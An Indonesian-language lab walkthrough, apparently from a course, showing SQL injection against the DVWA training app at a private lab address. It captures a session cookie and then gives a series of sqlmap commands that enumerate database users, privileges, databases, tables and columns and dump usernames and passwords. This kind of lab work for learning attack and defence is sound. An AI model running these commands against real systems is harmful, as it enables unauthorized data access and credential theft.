# DVWA | Lesson 4
## Konfigurasi

Alamat target DVWA `http://10.151.34.170`

## Skenario
Login ke DVWA
Masuk ke menu SQL Injection

- Buka Tamper Data pada menu Tools, kemudian pilih `Start Tamper`.

![alt text](./2.png)

- Pada form SQL Injection, masukkan string 1.

  Setelah itu, akan muncul pop up `Tamper with Request?`. Uncheck dan pilih Submit.

![alt text](./3.png)

- Copy Header `Referrer` dan `Cookie`.

![alt text](./4.png)

- Dan paste pada gedit.

![alt text](./5.png)

- Setelah itu jalan script dibawah, gunakan session ID yang sudah didapat dari hasil Tamper.
  Command tersebut digunakan untuk mendapatkan database dan user yang digunakan pada web.

![alt text](./6.png)
  Maka akan didapat current user `root@%` dan database `dvwa`.

![alt text](./7.png)
- Selanjutnya jalankan script berikut untuk mendapatkan Database Management User dan user yang tersedia beserta passwordnya
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" --string="Surname" --users --password
  ```
![alt text](./8.png)
- Selanjutnya jalankan script berikut untuk mendapatkan privileges dari user `db_hacker` yang telah dibuat pada lesson sebelumnya.
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" -U db_hacker --privileges
  ```

![alt text](./9.png)
- Selanjutnya jalankan script berikut untuk mendapatkan semua database yang terdapat pada host DVWA.
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" --dbs
  ```

![alt text](./10.png)
- Selanjutnya jalankan script berikut untuk mendapatkan nama-nama table pada database `dvwa`
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" -D dvwa --tables
  ```
![alt text](./11.png)
- Selanjutnya jalankan script berikut untuk mendapatkan column beserta tipe data dari database `dvwa` table `users`.
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" -D dvwa -T users --columns
  ```

![alt text](./12.png)

- Selanjutnya jalankan script berikut untuk mendapatkan username beserta password dari semua user yang terdapat pada table `users`.
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" -D dvwa -T users -C user,password --dump
  ```

![alt text](./13.png)
- Selanjutnya jalankan script berikut untuk mendapatkan username beserta password dari semua user yang terdapat pada table `users`. Data dump dari table `users` secara otomatis tersimpan pada file `users.csv`.
  ```
  ./sqlmap.py -u "http://10.151.34.170/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=ee2f320b543b3fa85497e6b387c1cfb; security=low" -D dvwa -T users -C user,password --dump
  ```

## Hasil
![alt text](./14.png)
